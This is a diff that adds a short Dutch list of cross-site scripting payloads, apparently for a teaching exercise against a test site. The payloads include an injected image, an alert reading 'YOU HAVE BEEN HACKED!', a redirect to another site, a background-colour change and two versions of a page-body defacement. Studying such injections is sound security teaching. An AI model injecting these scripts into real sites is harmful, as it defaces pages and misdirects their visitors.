@@ -1,0 +1,17 @@
+- Foto tonen:
+<img src='https://bin.snmmd.nl/m/06pyh5bwam5x.jpg' />
+
+- Javascript alert dialoog tonen
+<script>alert('YOU HAVE BEEN HACKED!');</script>
+
+- De pagina redirecten/doorverwijzen naar een andere pagina (hierna zelf database resetten/verwijderen)
+<script>document.location.href = 'https://www.google.com'</script>
+
+- De achtergrondkleur van de body te veranderen
+<script>document.getElementsByTagName('body')[0].style.backgroundColor = 'green';</script>
+
+- Op de index pagina niets laten zien, behalve een eigen melding
+<script>document.getElementsByTagName('body')[0].innerHTML = '<h1>YOU HAVE BEEN HACKED</h1>';</script>
+
+- Op de index pagina niets laten zien, behalve een eigen melding
+<script>document.body.innerHTML = '<h1>YOU HAVE BEEN HACKED</h1>';</script>
